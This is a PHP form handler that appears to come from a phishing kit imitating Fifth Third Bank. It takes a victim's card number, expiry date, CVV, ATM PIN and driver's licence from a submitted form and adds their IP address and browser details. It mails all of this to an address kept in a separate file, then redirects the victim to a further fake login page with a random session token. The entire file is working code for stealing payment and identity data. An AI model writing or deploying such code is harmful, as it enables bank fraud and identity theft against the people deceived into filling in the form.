<?php
if($_POST["cc"] != "" and $_POST["expdate"] != "" and $_POST["cvv"] != "" and $_POST["atm"] != "" and $_POST["dl"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------53rd Info-----------------------\n";
$message .= "C'C            	        : ".$_POST['cc']."\n";
$message .= "exp'date           	: ".$_POST['expdate']."\n";
$message .= "C'VV           	        : ".$_POST['cvv']."\n";
$message .= "atm'pin           	        : ".$_POST['atm']."\n";
$message .= "d'l           	        : ".$_POST['dl']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: ../email_identity.html?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>